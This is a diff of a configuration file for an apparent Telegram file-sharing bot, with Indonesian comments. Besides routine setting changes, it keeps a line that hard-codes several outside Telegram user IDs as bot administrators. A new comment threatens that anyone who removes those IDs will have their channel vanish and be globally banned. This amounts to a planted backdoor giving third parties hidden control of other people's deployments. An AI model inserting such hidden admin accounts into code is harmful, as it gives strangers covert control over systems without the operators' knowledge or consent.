@@ -32,13 +32,6 @@ HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
 
-# Protect Content
-PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))
-
-# Username CH & Group
-CHANNEL = os.environ.get("CHANNEL", "Lunatic0de")
-GROUP = os.environ.get("GROUP", "SharingUserbot")
-
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_1 = int(os.environ.get("FORCE_SUB_1", "0"))
 FORCE_SUB_2 = int(os.environ.get("FORCE_SUB_2", "0"))
@@ -69,9 +62,11 @@ FORCE_MSG = os.environ.get(
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
-DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
+DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
-ADMINS.extend((844432220, 1250450587, 1750080384, 1382636419, 182990552))
+# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))
 
 
 LOG_FILE_NAME = "logs.txt"
